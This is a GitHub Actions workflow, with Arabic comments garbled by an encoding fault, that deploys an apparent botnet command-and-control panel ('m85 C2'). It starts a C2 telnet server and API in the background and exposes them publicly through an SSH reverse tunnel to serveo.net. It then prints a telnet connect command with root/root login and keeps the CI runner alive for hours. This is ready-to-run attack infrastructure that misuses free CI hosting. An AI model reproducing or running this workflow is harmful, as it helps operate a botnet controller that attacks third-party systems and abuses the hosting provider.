name: m85 C2 Panel Ultimate
on:
  workflow_dispatch:

jobs:
  deploy-and-run:
    runs-on: ubuntu-latest
    timeout-minutes: 355  # ุงูุนูู ููุฏุฉ 6 ุณุงุนุงุช ูุญุฏ ุฃูุตู
    
    steps:
      # 1. ุณุญุจ ูููุงุช ุงููุดุฑูุน ุงูุฃุตูู
      - name: Checkout Project
        uses: actions/checkout@v4
        with:
          repository: 'iamthebestm85/m85C2'

      # 2. ุชุฌููุฒ ูุบุฉ Go (ูุชุดุบูู ุงูุณูุฑูุฑ ุงูุฑุฆูุณู)
      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.21'

      # 3. ุชุฌููุฒ ูุบุฉ Node.js (ูุชุดุบูู ุงูู API)
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      # 4. ุชุฌููุฒ ูุบุฉ Python (ูุฃุฏูุงุช ุงูุตูุฑ)
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      # 5. ุชุซุจูุช ุฌููุน ุงูููุชุจุงุช ุงููุทููุจุฉ ุฏูุนุฉ ูุงุญุฏุฉ
      - name: Install All Dependencies
        run: |
          echo ">>> Installing Python Requirements..."
          pip install numpy Pillow
          
          echo ">>> Installing Node.js Requirements..."
          npm install express child_process
          
          echo ">>> Initializing Go Module..."
          # ุงูุชุฃูุฏ ูู ูุฌูุฏ ููู go.mod
          if [ ! -f go.mod ]; then go mod init m85-c2; fi
          go mod tidy

      # 6. ุชุดุบูู ุงูุฎุฏูุงุช (API ู C2) ูู ุงูุฎูููุฉ
      - name: Start C2 Services
        run: |
          echo ">>> Starting API Server on Port 9998..."
          nohup node api.js > api_log.txt 2>&1 &
          
          echo ">>> Starting C2 Telnet Server on Port 1111..."
          nohup go run c2.go > c2_log.txt 2>&1 &
          
          # ุงูุงูุชุธุงุฑ 5 ุซูุงูู ููุชุฃูุฏ ูู ุฃู ุงูุณูุฑูุฑุงุช ุงุดุชุบูุช
          sleep 5
          
          # ุงูุชุญูู ุงูุณุฑูุน ูู ุฃู ุงูุนูููุงุช ุชุนูู
          if pgrep -f "go run c2.go" > /dev/null; then
            echo ">>> C2 Server is RUNNING successfully."
          else
            echo ">>> WARNING: C2 Server might have failed. Check logs."
            cat c2_log.txt
          fi

      # 7. ูุชุญ ุงูููู (Tunnel) ูุนุฑุถ ูุนูููุงุช ุงูุงุชุตุงู
      - name: Create Tunnel & Show Login Info
        run: |
          echo ">>> Requesting a raw TCP tunnel from Serveo..."
          
          # ูุทูุจ ูููุฐ ุนุดูุงุฆู (0) ููุงุชุตุงู ุจู localhost:1111
          ssh -o StrictHostKeyChecking=no -R 0:localhost:1111 serveo.net > connection_info.txt 2>&1 &
          
          # ุงูุชุธุงุฑ 10 ุซูุงูู ุญุชู ูุนุทููุง Serveo ุงูุฑุงุจุท ูุงููููุฐ
          sleep 10
          
          echo "=========================================================="
          echo "       โ  S E R V E R   R E A D Y  โ"
          echo "=========================================================="
          echo "๐ ุงูุณุฎ ุงูุฃูุฑ ุงูุชุงูู ูุถุนู ูู Termux ููุงุชุตุงู ๐"
          echo ""
          # ุงุณุชุฎุฑุงุฌ ูุนุฑุถ ุฃูุฑ ุงูุงุชุตุงู ุงูุฌุงูุฒ
          grep -o "Forwarding TCP from serveo.net:[0-9]*" connection_info.txt | awk -F: '{print "telnet serveo.net " $2}'
          echo ""
          echo "=========================================================="
          echo "๐ Username: root"
          echo "๐ Password: root"
          echo "=========================================================="
          
          # ุนุฑุถ ุงูุณุฌู ูู ุญุงู ูุดู ุงูุงุณุชุฎุฑุงุฌ
          echo "DEBUG INFO (If link is missing above):"
          cat connection_info.txt

          # ุฅุจูุงุก ุงูุฌูุณุฉ ุชุนูู
          sleep 21500

